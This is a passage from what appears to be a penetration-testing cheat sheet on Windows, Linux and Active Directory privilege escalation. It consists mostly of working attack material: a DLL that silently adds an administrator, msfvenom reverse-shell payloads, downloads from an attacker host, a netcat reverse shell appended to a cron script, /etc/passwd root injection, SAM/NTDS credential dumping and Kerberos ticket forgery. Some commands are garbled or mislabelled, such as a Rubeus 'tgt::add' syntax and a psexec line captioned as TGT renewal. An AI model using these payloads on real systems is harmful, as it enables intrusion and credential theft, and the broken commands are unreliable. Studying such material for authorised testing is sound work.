> x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
> ```

5. Creating an Executable that is a Reverse Shell

- ### For 64-bit executable
> ```bash
> msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o reverse_shell.exe
>```

- ### For 32-bit executable
> ```bash
> msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o reverse_shell.exe
> ```

6. Replacing the Service Binary with a Malicious Binary It can be a reverse shell generated from msfvenom or for example the program above that will add a new user to the system.

- ### Remember to run the HTTP server on your Kali to be able to bring the binary.
> ```powershell
>  iwr -uri http://<attacker-ip>/adduser.exe -Outfile adduser.exe
>
> move "C:\Path\To\ServiceBinary.exe" "C:\Path\To\Backup\ServiceBinary.exe"
> 
> move .\adduser.exe "C:\Path\To\ServiceBinary.exe"
> ```

7. Restart the Service

- ### Using PowerShell Function
> ```powershell
> Restart-Service -Name '<ServiceName>'
> ```
- ### Using sc.exe
> ```cmd
> sc.exe stop <ServiceName>
> sc.exe start <ServiceName>
> ```

8. Restart the System
- ### First check for reboot privileges: SeShutdownPrivilege should be Assigned and Enabled.
> ```cmd
> whoami /priv
>```
- ### Perform the restart
> ```cmd
> shutdown /r /t 0
> ```

**Service DLL Hijacking**

Windows searches for DLLs in a specific order. To exploit DLL hijacking, understand the order:

    1. The directory from which the application loaded.
    2. The system directory (e.g., C:\Windows\System32).
    3. The 16-bit system directory (e.g., C:\Windows\System32\System).
    4. The Windows directory (e.g., C:\Windows).
    5. The current directory.
    6. The directories listed in the PATH environment variable.

1. Display Running Service Information

- ### List running services and their executable paths
> ```powershell
> Get-CimInstance -ClassName win32_service | Select Name, State, PathName | Where-Object {$_.State -like 'Running'}
> ```

2. Check PATH Locations Examine the PATH environment variable to determine where DLLs might be loaded from.

- ### Display the PATH environment variable
> ```cmd
> $env:path
> ```

3. Create a Malicious DLL That Adds a New Administrator User Write a DLL that executes commands when loaded. For example, create a DLL to add a new administrator user.
> ```c
> #include <windows.h>
>
> BOOL APIENTRY DllMain(
>     HMODULE hModule,       // Handle to DLL module
>     DWORD ul_reason_for_call, // Reason for calling function
>     LPVOID lpReserved      // Reserved
> ) {
>     if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
>         // Execute system commands to add a new user and grant admin rights
>         system("net user emma Password123! /add");
>         system("net localgroup administrators emma /add");
>     }
>     return TRUE;
> }
> ```

- ### Cross-Compile the DLL
> ```bash
> x86_64-w64-mingw32-gcc DLLMain.cpp --shared -o DLLMain.dll
> ```

4. Creating a DLL that is a Reverse Shell
- ### For 64-bit DLL
> ```bash
> msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f dll -o reverse_shell.dll
> ```
- ### For 32-bit DLL
> ```bash
> msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f dll -o reverse_shell.dll
> ```

5. Replace the DLL and Restart the Service It can be a reverse shell generated from msfvenom or for example the program above that will add a new user to the system.
- ### Bring the file from your Kali using an HTTP server
- ### Move the original DLL (back it up if necessary)
> ```cmd
> move "C:\path\to\original\DLL.dll" "C:\path\to\backup\DLL.dll"
> ```
- ### Replace it with your malicious DLL
> ```cmd
> move "C:\path\to\malicious\myDLL.dll" "C:\path\to\service\DLL.dll"
> ```
- ### Restart the service
> ```powershell
> Restart-Service -Name "[serviceToHijack]"
> ```

6. Verify Execution of the Malicious Code Check if the malicious code (e.g., user creation) has been executed successfully; or if it was the reverse shell you should have receive the connection to the Netcat listener back.
- ### List users to check if the new user was added
> ```cmd
> net user
> ```
- ### List local administrators to verify if the new user is an admin
> ```cmd
> net localgroup administrators
> ```

7. Verify that the PATH environment variable still includes the expected directories.
- ### Display the PATH environment variable
> ```cmd
> $env:path
> ```

**Unquoted Service Paths**

1. List Services with Unquotes Pahts
> ```cmd
> wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
> ```

Path Resolution Process When Windows attempts to locate the executable, it checks paths in the following order:

    Initial Path Attempt: Windows first attempts to execute the path as specified. For example, if the service path is C:\Program Files\MyApp\app.exe, it tries to run C:\Program Files\MyApp\app.exe.
    Path Segmentation: If the path contains spaces and is not quoted, Windows tries different combinations by breaking the path at each space and appending .exe to each segment. This means Windows will attempt to execute:
        C:\Program.exe
        C:\Program Files\MyApp.exe
        C:\Program Files\MyApp\app.exe
    Directory Check: If a malicious executable is placed in one of these directories (e.g., C:\Program Files\), Windows might execute this malicious file instead of the intended app.exe.

For example, for a service path C:\Program Files\ExampleApp\ExampleService.exe, Windows might try: C:\Program.exe (if a malicious file is here). Proper quoting of paths is essential to prevent these vulnerabilities.

2. Review Directory Permissions
> ```cmd
> icacls "<PathToDirectory>"
> ```

3. Automating the Enumeration Process with PowerUp
[Find PowerUp.ps1 here](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)

- ### Download PowerUp script
> ```powershell
> iwr http://<YourServerIP>/PowerUp.ps1 -Outfile PowerUp.ps1
> ```
- ### Bypass execution policy and run the script
> ```powershell
> powershell -ep bypass
> . .\PowerUp.ps1
> ```
- ### List unquoted service paths
> ```powershell
> Get-UnquotedService
> ```

4. Exploit Unquoted Service Paths
- ### Create the binary from Kali, could be any program, for example a reverse shell, or a program that adds a new user.
- ### Replace service binary with malicious executable (Manually)
> ```powershell
> copy <malicious_file> "C:\Program Files\ExampleApp\Current.exe"
> ```
- ### Replace service binary with malicious executable (with PowerUp)
> ```powershell
> Write-ServiceBinary -Name '<ServiceName>' -Path '<PathToMaliciousExecutable>'
> ```
- ### Restart the service
> ```powershell
> Restart-Service <ServiceName>
> ```
- ### Verify the service status
> ```powershell
> Get-Service -Name '<ServiceName>'
> ```
- ### Check event logs for service-related events
> ```powershell
> Get-WinEvent -LogName System | Where-Object {$_.Id -eq 7036 -and $_.Message -like "*<ServiceName>*"}
> ```

**Scheduled Tasks**

1. List all Scheduled Tasks
> ```cmd
> schtasks /query /fo LIST /v
> ```

2. Review Permissions on the Executable
> ```cmd
> icacls "C:\Path\To\ScheduledTaskExecutable.exe"
> ```

3. Download and Replace the Executable File
> ```powershell
> iwr -Uri http://<attacker-ip>/malicious.exe -Outfile malicious.exe
>
> move C:\Path\To\TargetDirectory\Executable.exe C:\Path\To\Backup\OriginalExecutable.bak
>
> move .\malicious.exe C:\Path\To\TargetDirectory\Executable.exe
> ```

**Finding Passwords**

- ### Using Findstr
> ```cmd
> findstr /si password *.txt
> findstr /si password *.xml
> findstr /si password *.ini
> ```

- ### Searching in Configuration Files
> ```cmd
> dir /s *pass* == *cred* == *vnc* == *.config*
> ```

- ### Searching in All Files
> ```cmd
> findstr /spin "password" *.*
> findstr /spin "password" *.*
> ```

- ### Check Specific Files
These files often contain cleartext credentials:
-  c:\sysprep.inf
-  c:\sysprep\sysprep.xml
-  c:\unattend.xml
-  %WINDIR%\Panther\Unattend\Unattended.xml
-  %WINDIR%\Panther\Unattended.xml

- ### Searching for VNC Password Files
> ```cmd
> dir c:\*vnc.ini /s /b
> dir c:\*ultravnc.ini /s /b 
> dir c:\ /s /b | findstr /si *vnc.ini
> ```

- ### Shadow Copies (SAM, SYSTEM, NTDS.dit, SECURITY, NTUSER.dat)
If you find a Windows.Old folder or can access Volume Shadow Copies, you can copy important files like SYSTEM, SAM, NTDS.dit, SECURITY, and NTUSER.dat for offline credential extraction. Keep in mind that these could also be located in other folders, for example and SMB share folder; the path it is usually something like C:\Windows\System32\SAM or C:\windows.old\Windows\System32\SAM.
IMPORTANT: if we are using any impacket-tool we could use their built-in function to download the contents to our Kali, but if we are using a reverse shell we can use the strategies of the Section 17 (File Transfers) to bring the files to our Kali.

- ### Key Files to Target
    SAM: Stores user password hashes.
    SYSTEM: Used to decrypt SAM and other sensitive files.
    NTDS.dit: Active Directory database, found on Domain Controllers, containing domain-wide user credentials.
    SECURITY: Contains LSA secrets, cached credentials, and security policies.
    NTUSER.dat: Contains user-specific registry information, including credentials for network drives or applications.

- ### Dumping SAM and SYSTEM Files
Dump the SAM file
> ```cmd
> reg save hklm\sam <destination_path>\sam
> ```
Dump the SYSTEM file
> ```cmd
> reg save hklm\system <destination_path>\system
> ```
Extract credentials on Kali
> ```bash
> samdump2 <system_file> <sam_file>
> ```
or
> ```bash
> impacket-secretsdump -sam <sam_file> -system <system_file> LOCAL
> ```

(Optional): use Mimikatz to extract the credentials if it is not possible to bring the files to the Kali.
> ```text
> mimikatz # lsadump::sam /sam:"<sam_file>" /system:"<system_file>"
> ```

- ### Accessing NTDS.dit (Active Directory Database)
Copy NTDS.dit from a shadow copy
> ```cmd
> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ShadowCopyID>\windows\ntds\ntds.dit <destination_path>\ntds.dit.bak
> ```

- ### Save the SYSTEM hive for decryption
> ```cmd
> reg.exe save hklm\system <destination_path>\system.bak
> ```

- ### Extract AD credentials on Kali
> ```bash
> impacket-secretsdump -ntds <ntds_dit_backup> -system <system_backup> LOCAL
> ```

(Optional): use Mimikatz to extract the credentials if it is not possible to bring the files to the Kali.
> ```text
> mimikatz # lsadump::ntds /ntds:"<ntds_dit_backup>" /system:"<system_backup>"
> ```

- ### Dumping SECURITY Hive for LSA Secrets & Cached Credentials
Dump the SECURITY hive
> ```cmd
> reg save hklm\security <destination_path>\security
> ```

- ### Dump the SYSTEM file
> ```cmd
> reg save hklm\system <destination_path>\system
> ```

- ### Extract LSA Secrets on Kali
> ```bash
> impacket-secretsdump -security <security_file> -system <system_file> LOCAL
> ```

(Optional): use Mimikatz to extract the credentials if it is not possible to bring the files to the Kali.
> ```text
> mimikatz # lsadump::secrets /security:"<security_file>" /system:"<system_file>"
> ```

- ### Extracting User-Specific Credentials from NTUSER.dat
Access NTUSER.dat:, download the NTUSER.dat file from a user profile, typically found in C:\Users\<username>\NTUSER.dat

- ### Load the NTUSER.dat hive
> ```cmd
> reg load hku\TempHive <path_to_ntuser.dat>
> ```

Look for credentials and interesting values: Check for saved credentials, network drive mappings, or application data within the user’s registry.

- ### General Volume Shadow Copy Access
We can use Volume Shadow Copies to access historical versions of key files:

- ### List available shadow copies
> ```cmd
> vssadmin list shadows
> ```

- ### Copy any file from a shadow copy
> ```cmd
> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ShadowCopyID>\<path_to_file> <destination_path>
> ```

Check [HackTricks](https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html) for more in-depth PrivEsc

## Linux

| Command                                       | Example Usage                                        |
|-----------------------------------------------|------------------------------------------------------|
| **Displays user ID, group ID, and privileges of the current user** | `id`                                                   |
| **Shows the name of the system's host**       | `hostname`                                            |
| **Displays the operating system version, release info, and kernel architecture** | `cat /etc/issue` <br> `cat /etc/os-release` <br> `uname -a` |
| **Lists all running processes with their users, CPU usage, and other details** | `ps aux`                                              |
| **Lists network interfaces, IP addresses, routing tables, and open ports** | `ip a` <br> `ss -anp`                                 |
| **Displays the current iptables firewall rules (if applicable)** | `cat /etc/iptables/rules.v4`                          |
| **Lists scheduled cron jobs for the system and users** | `ls -lah /etc/cron*` <br> `crontab -l` <br> `sudo crontab -l` |
| **Shows installed packages and versions on Debian-based systems** | `dpkg -l`                                             |
| **Searches for directories that are writable by the current user** | `find / -writable -type d 2>/dev/null`                |
| **Displays possible passwords that are in memory** | `strings /dev/mem -n10 | grep -i PASS`               |
| **Find possible files with sensitive information** | `locate password | more`                              |
| **Lists currently mounted drives and their mount points** | `cat /etc/fstab` <br> `mount` <br> `lsblk`             |
| **Lists loaded kernel modules and displays info about a specific module** | `lsmod` <br> `/sbin/modinfo <driver_name>`            |
| **Finds files with the SUID bit set, which could be used to escalate privileges** | `find / -perm -u=s -type f 2>/dev/null` <br> `sudo -l` <br> `sudo -i` |

**Always check mail Folders**
- /var/mail
- /var/spool/mail

**GTFObins**
- Enumerate sudo privileges
- Check [GTFObins](https://gtfobins.org/)

**Inspecting Service Footprints**

- ### Monitor active processes for passwords and other credentials
> ```bash
> watch -n 1 "ps -aux | grep pass"
> ```

- ### Sniff passwords on the loopback interface using tcpdump
> ```bash
> sudo tcpdump -i lo -A | grep "pass"
> ```

- ### Inspect Tcpdump
> ```bash
> tcpdump -i any -s0 -w capture.pcap
> tcpdump -i eth0 -w capture -n -U -s 0 src not 10.11.1.111 and dst not 10.11.1.111
> tcpdump -vv -i eth0 src not 10.11.1.111 and dst not 10.11.1.111
> bash

**Cronjobs**

- ### Find CRON Jobs
> ```bash
> grep "CRON" /var/log/syslog
> ```
or
> ```bash
> cat /var/log/cron.log
> ```

- ### Check permissions for the script
> ```bash
> ls -lah /path/to/script.sh
> ```

- ### Modify the script to add a reverse shell (in case we have permissions to edit), depending on the case another possible payloads could be added, for example adding a new root user.
> ```bash
> echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [attacker_ip] [listener_port] >/tmp/f" >> /path/to/script.sh
> ```

### (Optional) Other Commands to Inspect Cron Jobs.
> ```bash
> crontab -l
> ls -alh /var/spool/cron
> ls -al /etc/ | grep cron
> ls -al /etc/cron*
> cat /etc/cron*
> cat /etc/at.allow
> cat /etc/at.deny
> cat /etc/cron.allow
> cat /etc/cron.deny
> cat /etc/crontab
> cat /etc/anacrontab
> cat /var/spool/cron/crontabs/root
> ```

**Overwriting /etc/passwd**

1. Create the hash
> ```bash
> openssl passwd Password123
> ```

2. Add the hash to the /etc/passwd file
### This is just an example using the output of the previous command.
> ```bash
> echo"newroot:$6$rounds=656000$6B8ZJQ4aK7G9P/8c$hx0E6ke7zxz1mUMN6LCyRJp2bV5hEE7EowzjEbLXwO6KZV7Ojo0DWg1lzCjLwWg.0tLGfhFe42NnJ8LMtBzD0:0:0:root:/root:/bin/bash">> /etc/passwd
> ```

3. Switch to the new user
> ```bash
> su newroot
> ```

4. Verify root access
> ```bash
> id
> ```

**Overwriting /etc/shadow**

1. Get the hash out.
> ```bash
> cat /etc/shadow | grep [root_user] > [root_user]_hash.txt
> ```

2. Crack the hash
### John The Ripper
> ```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt [root_user]_hash.txt
> ```
### Hashcat, we need to isolate the hash part, for example from above hash would be: $6$rounds=656000$6B8ZJQ4aK7G9P/8c$hx0E6ke7zxz1mUMN6LCyRJp2bV5hEE7EowzjEbLXwO6KZV7Ojo0DWg1lzCjLwWg.0tLGfhFe42NnJ8LMtBzD0
> ```bash
> hashcat -m 1800 [root_user]_hash.txt /usr/share/wordlists/rockyou.txt
> ```

3. Show the password
### John The Ripper
> ```bash
> john --show [root_user]_hash.txt
> ```
### Hashcat
> ```bash
> hashcat -m 1800 [root_user]_hash.txt /usr/share/wordlists/rockyou.txt --show
> ```

**SETUID Binaries**

Use [suid3num.py](https://github.com/Anon-Exploiter/SUID3NUM/tree/master) or [linpeas.sh](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)


1. Finding the Process ID (PID) of a Running Binary:
> ```bash
> ps u -C [binary_name]
> ```

2. Inspect Credentials of a Running Process:
> ```bash
> cat /proc/[PID]/status | grep Uid
> ```

3. Getting a Reverse Shell Using find:
> ```bash
> find [directory] -exec [path_to_shell] \;
> ```

Exploit:
### Replace [vulnerable_binary] with the name of the binary you are targeting.
> ```bash
> find / -name [vulnerable_binary] -exec /bin/bash -p \;
> ```

**Capabilities**

1. Enumerate Capabilities:
> ```bash
> /usr/sbin/getcap -r / 2>/dev/null
> ```

2. Inspect a Specific Binary for Capabilities:
> ```text
> getcap [binary_path]
> ```
### For example
> ```bash
> getcap /usr/bin/nmap
> ```

3. Adjust Capabilities (Requires root):
> ```text
> setcap [capabilities] [binary_path]
> ```
### Example to add CAP_DAC_OVERRIDE to a binary
> ```bash
> setcap cap_dac_override=eip /path/to/binary
> ```

4. Remove Capabilities (Requires root):
> ```text
> setcap -r [binary_path]
> ``` 
### For example
> ```bash
> setcap -r /usr/bin/nmap
> ```

| Capability               | Description                                                                 | Potential Use                                                   |
|--------------------------|-----------------------------------------------------------------------------|-----------------------------------------------------------------|
| **CAP_AUDIT_CONTROL**     | Allows enabling or disabling kernel auditing.                               | Can be used to disable auditing mechanisms and evade detection. |
| **CAP_AUDIT_WRITE**       | Allows writing records to the kernel auditing log.                          | Can be used to manipulate or inject log entries, potentially covering up malicious activities. |
| **CAP_BLOCK_SUSPEND**     | Prevents the system from suspending or hibernating.                         | Can be used to keep a system awake, which might be useful for long-running attacks or preventing automatic lockdowns. |
| **CAP_CHOWN**             | Allows arbitrary changes to file UIDs and GIDs.                             | Enables changing file ownership, potentially allowing privilege escalation or tampering with critical files. |
| **CAP_DAC_OVERRIDE**      | Bypasses file read, write, and execute permission checks.                   | Provides unrestricted access to files, regardless of permissions, which can be used to access or modify sensitive files. |
| **CAP_DAC_READ_SEARCH**   | Bypasses file and directory read and execute permission checks.             | Allows reading and searching files and directories that would normally be restricted. |
| **CAP_FOWNER**            | Bypasses permission checks on operations that require the filesystem UID of the process to match the UID of the file. | Allows performing actions on files that normally require matching ownership, potentially enabling unauthorized file modifications. |
| **CAP_IPC_LOCK**          | Allows locking memory into RAM.                                             | Can be used to prevent critical memory from being swapped out, which may be useful for maintaining persistence or performance in an attack. |
| **CAP_KILL**              | Allows sending signals to processes owned by other users.                   | Can be used to terminate or signal processes belonging to other users, potentially disrupting services or attacking other users' processes. |
| **CAP_MAC_ADMIN**         | Allows configuring or changing Mandatory Access Control (MAC) settings.      | Provides the ability to alter MAC policies, which could weaken security policies or bypass certain security controls. |
| **CAP_NET_BIND_SERVICE**  | Allows binding sockets to privileged ports (ports below 1024).              | Enables services to listen on standard ports (e.g., 80, 443) without requiring root privileges, which might be used to disguise malicious services as legitimate ones. |
| **CAP_NET_RAW**           | Allows using raw and packet sockets.                                        | Can be used for network sniffing, crafting custom packets, or bypassing network filters and protections. |
| **CAP_SETGID**            | Allows changing the GID of a process.                                       | Enables changing the group ID of processes, which can affect group-based permissions and access controls. |
| **CAP_SETPCAP**           | Allows transferring and removing capabilities from processes.               | Enables modifying the capabilities of running processes, which can be used to escalate privileges or evade detection. |
| **CAP_SETUID**            | Allows changing the UID of a process.                                       | Provides the ability to change the user ID of processes, potentially leading to privilege escalation or impersonation. |

**Wildcard Exploitation**

Wildcard exploitation involves leveraging wildcards (*, ?, []) in file and command operations to gain unauthorized access or perform unintended actions. This section covers common methods and examples for exploiting wildcards in Linux environments.

Wildcard Basics
    Asterisk (*): Matches any number of characters, including zero.
    Question Mark (?): Matches exactly one character.
    Square Brackets ([]): Matches any one of the enclosed characters.

Exploitation Guide
Since this is a complex exploitation technique, if we find a script, cron jobs, tasks or else for which we can perform wildcard exploitation, we could follow these two guides on how to do it:

    Tar Wildcard Injection
    Wildcards with tar

Exploiting Wildcards in Command Execution
    Wildcard Expansion in Commands: Wildcards can be used to execute commands on multiple files or directories. This can be exploited if an application or script does not handle wildcards properly.

ls /var/log/*

    Misconfigured Scripts: If a script uses wildcards in a vulnerable way, it can lead to command injection or unintended behavior.

# Example vulnerable script
tar -cvf archive.tar.gz /var/log/*

Exploiting Wildcards in File Operations

    File Creation and Modification: Wildcards can be used to create or modify multiple files if the application or script does not properly sanitize input.

touch /tmp/file_*

    Race Conditions: Wildcards in file operations can be exploited to create race conditions.

# If an attacker can modify files in /etc/, they could exploit the wildcard to overwrite or manipulate critical configuration files.
cp /etc/* /tmp/backup/

**User Installed Software**

Check for third-party software installed by the user. These programs might have vulnerabilities, so it's important to investigate further.

Common directories for user-installed software:

- /usr/local/
- /usr/local/src
- /usr/local/bin
- /opt/
- /home
- /var/
- /usr/src/

Check installed software by distribution:

### Debian/Ubuntu
> ```bash
> dpkg -l
> ```
### CentOS/openSUSE/Fedora/RHEL
> ```bash
> rpm -qa
> ```
### OpenBSD/FreeBSD
> ```bash
> pkg_info
> ```

**World Writable**

### World-writable directories
> ```bash
> find / -writable -type d 2>/dev/null
> find / -perm -222 -type d 2>/dev/null
> find / -perm -o w -type d 2>/dev/null
> ```
### World-executable directories
> ```bash
> find / -perm -o x -type d 2>/dev/null
> ```
### World-writable and executable directories
> ```bash
> find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
> ```

---

## Active Directory

**Quick Reference**

- Nmap Scripting Scan
### Check for Kerberos service availability and get basic information
> ```bash
> nmap -p 88 --script kerberos-enum-users <target_ip>
> ```
### Check for common Kerberos vulnerabilities
> ```bash
> nmap -p 88 --script kerberos-brute <target_ip>
> ```
### Enumerate SPNs (Service Principal Names)
> ```bash
> nmap -p 88 --script krb5-enum-users,krb5-scan <target_ip>
> ```

- AS-REP Roasting: extract accounts with pre-authentication disabled using GetNPUsers.py (impacket-GetNPUsers); keep in mind that should also use kerbrute to find possible valid usernames, commands for this are in the Section 1.4.7.
> ```bash
> impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <dc-ip> -format hashcat
> ```
or
> ```bash
> impacket-GetNPUsers <domain>/ -no-pass -usersfile <path_to_userlist> -dc-ip <domain_controller_ip>
> ```
- Crack the found hashes
> ```bash
> hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
> ```

- Kerberoasting: use GetUserSPNs.py to extract SPNs.
> ```bash
> impacket-GetUserSPNs <domain>/<username>:<password> -dc-ip <dc-ip>
> ```
- Crack the resulting hash
> ```bash
> hashcat -m 13100 kerberoast.txt rockyou.txt
> ```

- Enumerate Kerberos Principal Names: use kerbrute to enumerate valid user accounts by attempting to authenticate with a list of usernames.
> ```bash
> kerbrute userenum -d <domain> -p <userlist> <target_ip>
> ```
or
> ```bash
> ./kerbrute userenum -d <target_ip> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
> ```

- Perform Kerberos Ticket Extraction (AS-REP Roasting): request non-preauthenticated Kerberos tickets for a list of users.
> ```bash
> impacket-GetNPUsers -dc-ip <dc_ip> -request -usersfile <userlist> <target_domain>
> ```

-Perform Kerberos Ticket Request with AS-REP Roasting: request a Ticket Granting Ticket (TGT) for a specific user.
> ```bash
> impacket-GetTGT -dc-ip <dc_ip> -outputfile <outputfile> <username>@<domain>
> ```

- Crack Kerberos Tickets
> ```bash
> john --wordlist=<wordlist> <ticket_file>
> ```
### or
> ```bash
> hashcat -m 13100 <ticket_file> <wordlist>
> ```

- Kerberos Ticket Extraction: request a TGT or Service Ticket (TGS) using specified credentials.
### Request a TGT (Ticket Granting Ticket)
> ```bash
> impacket-getTGT -dc-ip <dc_ip> <domain>/<username>:<password>
> ```

-  Request a Service Ticket (TGS)
> ```bash
> impacket-GetST -dc-ip <dc_ip> <domain>/<username>:<password> -spn <service>/<target>
> ```

- Kerberoasting: extract and crack service tickets to gain access to service accounts.
### Extract all service tickets for offline cracking
> ```bash
> impacket-GetUserSPNs -dc-ip <dc_ip> -outputfile <tickets_file> <domain>/<username>:<password>
> ```

- Crack the extracted tickets with John the Ripper or Hashcat
> ```bash
> john --wordlist=<wordlist> <tickets_file>
> ```
### or
> ```bash
> hashcat -m 13100 <tickets_file> <wordlist>
> ```

- Kerberos Brute Forcing: perform brute force attacks on Kerberos tickets.
> ```
> ./kerbrute -d <domain> -t <target_ip> -u <username> -p <password_list>
> ```

- Kerberos Ticket Manipulation: use tools to request, manipulate, and renew Kerberos tickets for privilege escalation or impersonation.
### Renew a TGT (for Kerberos ticket manipulation)
> ```bash
> impacket-psexec <domain>/<username>:<password>@<target_ip> -impersonate-user <target_user>
> ```

- Perform Kerberos attacks with Rubeus
> ```cmd
> rubeus.exe asktgt /user:<username> /rc4:<password>
> rubeus.exe tgtdeleg /user:<username> /rc4:<password>
> rubeus.exe s4u /user:<username> /rc4:<password> /impersonateuser:<target_user>
> ```

- Kerberos Ticket Dumping: extract Kerberos tickets from memory for offline analysis.
### Dump Kerberos tickets from memory using Mimikatz
> ```text
> mimikatz "lsadump::dcom" "sekurlsa::tickets /export"
> ```

- Kerberos Pre-Authentication: identify weak configurations that might allow attackers to perform brute force attacks.
### Test for weak pre-authentication configurations
> ```bash
> ./kerbrute -d <domain> -u <user_list> -p <password_list> -dc <dc_ip>
> ```

- Kerberos Silver Ticket Attacks: forge high-value Kerberos tickets for access and privilege escalation.
### Create a silver ticket with Rubeus
> ```cmd
> rubeus.exe tgt::add /user:<username> /rc4:<password> /sid:<domain_sid> /domain:<domain>
> ```

Steps to Perform Silver Ticket Attack
### 1. Obtain a Valid TGT (Ticket Granting Ticket)
> ```bash
> impacket-GetTGT -dc-ip <dc_ip> -outputfile <tgt_file> <user>@<domain>
> ```
### 2. Forge a Silver Ticket
> ```bash
> impacket-atexec -target-ip <target_ip> -service <service> -ticket <ticket_file> <username>
> ```

Kerberos Golden Ticket Attacks: forge high-value Kerberos tickets for access and privilege escalation.
### Create a golden ticket with Rubeus
> ```cmd
> rubeus.exe tgt::add /user:<username> /rc4:<password> /domain:<domain> /sid:<domain_sid> /rc4:<krbtgt_hash>
> ```

Steps to Perform Golden Ticket Attack

### 1. Obtain KRBTGT NTLM Hash
> ```bash
> impacket-secretsdump -outputfile <dump_file> <target_domain>/<username>:<password>@<dc_ip>
> ```
### 2. Generate a Golden Ticket
> ```bash
> ticketer -user <user> -domain <domain> -sid <domain_sid> -krbtgt <krbtgt_hash> -output <ticket_file>
> ```
### 3. Use the Golden Ticket
> ```bash
> impacket-smbexec -target-ip <target_ip> -ticket <ticket_file> <username>
> ```
### (Optional) Pass the Golden Ticket
> ```bash
> impacket-psexec -target-ip <target_ip> -ticket <ticket_file> <username>
> ```

### Example of Enumeration
- Perform LDAP Search: retrieve potential user and password information.
> ```bash
> ldapsearch -x -H ldap://<dc-ip> -b "dc=domain,dc=com"
> ```
- Enumerate DNS: gather information about key servers within the domain.
> ```bash
> gobuster dns -d domain.com -t 25 -w /us/share/wordlists/Seclist/Discovery/DNS/subdomain-top2000.txt
> ```

- Check SMB Shares

### Enumerate LDAP Services:
> ```bash
> nmap -n -sV --script "ldap* and not brute" -p 389 <dc-ip>
> ```

- Find Valid Users:
### Using [Kerbrute](https://github.com/ropnop/kerbrute/releases)
> ```bash
> ./kerbrute -d [domain].com /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames
> ```

### Using CrackMapExec
> ```bash
> crackmapexec smb [domain].com -u '' -p '' --users
> ```

- Enumerate All AD Users: this has to be done after having valid credentials.
### Using GetAdUsers.py (same tool)
> ```bash
> impacket-GetADUsers -all -dc-ip <dc_ip> -u <username> -p <password> <domain>
> ```
### Using Enum4Linux
> ```bash
> enum4linux -a -u "<username>" -p "<password>" <dc_ip>
> ```

## Basic Enumeration

- Find my Domain SID:
### Using PowerShell
> ```powershell
> (Get-ADDomain).DomainSID
> ```

### Using CMD
> ```cmd
> whoami /user
> ```

### Using vmic
> ```cmd
> wmic useraccount where name='[usernameToFind]' get sid
> ```

- Find the name of my domain controller server:
### Using PowerShell
> ```powershell
> Get-ADDomainController -Filter *
> ```

### Using nltest
> ```cmd
> nltest /dclist:[YourDomainName]
> ```

### Using netdom
> ```cmd
> netdom query dc
> ```

### Using nslookup
> ```bash
> nslookup yourdomain.com
> ```

### Using ADUC
### Open ADUC --> In the Domain Controllers Organizational Unit (OU), you can find the domain controllers listed there.

- Find Service Account Names:
### Using PowerShell
### List All User Accounts with Service Principal Names (SPNs)
> ```powershell
> Get-ADUser -Filter {ServicePrincipalName -ne $null} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName
> ```

### Find Specific Service Accounts (e.g., SQL Server)
> ```powershell
> Get-ADUser -Filter {ServicePrincipalName -like "*MSSQL*"} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName
> ```

### Checking Running Services
> ```powershell
> Get-WmiObject -Class Win32_Service | Where-Object { $_.StartName -ne "LocalSystem" -and $_.StartName -ne "LocalService" -and $_.StartName -ne "NetworkService" } | Select-Object Name, StartName
> ```
or
> ```cmd
> sc queryex type= service
> ```

### Using nltest
> ```cmd
> nltest /domain_trusts
> ```

### Identify Specific Service Account by SPN
> ```powershell
> Get-ADServiceAccount -Filter * | Select-Object Name, ServicePrincipalNames
> ```

### Using ADUC
Open Active Directory Users and Computers and enable Advanced Features under the View menu. Browse to find service accounts.

- Finding SPNs:
### PowerShell
> ```powershell
> Get-ADComputer -Filter * -Properties ServicePrincipalName | Select-Object -ExpandProperty ServicePrincipalName
> ```  

### Bash (Kali)
> ```bash
> ldapsearch -x -h <DC_IP> -b "DC=domain,DC=com" "(&(objectClass=computer)(servicePrincipalName=*))" servicePrincipalName
> ```  

- Check users of the domain:
> ```cmd
> net user /domain
> net user [username] /domain
> ```

- Check groups of the domain:
> ```cmd
> net groups /domain
> net groups [groupName] /domain
> ```

- Script to get the full LDAP path:
> ```powershell
> $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
> $DN = ([adsi]'').distinguishedName 
> $LDAP = "LDAP://$PDC/$DN"
>
> Script to get full information for SAM account types:
>
> function Get-SAMInfo {
>   $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
>   $DN = ([adsi]'').distinguishedName 
>   $LDAP = "LDAP://$PDC/$DN"
>   $direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
>   $dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
>   $dirsearcher.filter = "samAccountType=805306368"
>   $dirsearcher.FindAll() | ForEach-Object {
>       $_.Properties
>   }
> }
> ```

- Enumerate nested groups with custom LDAP query:
> ```powershell
> $group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=[GroupName]))"
> ```

- Encapsulate LDAP search into a function:
> ```powershell
> function LDAPSearch {
>   param ([string]$LDAPQuery)
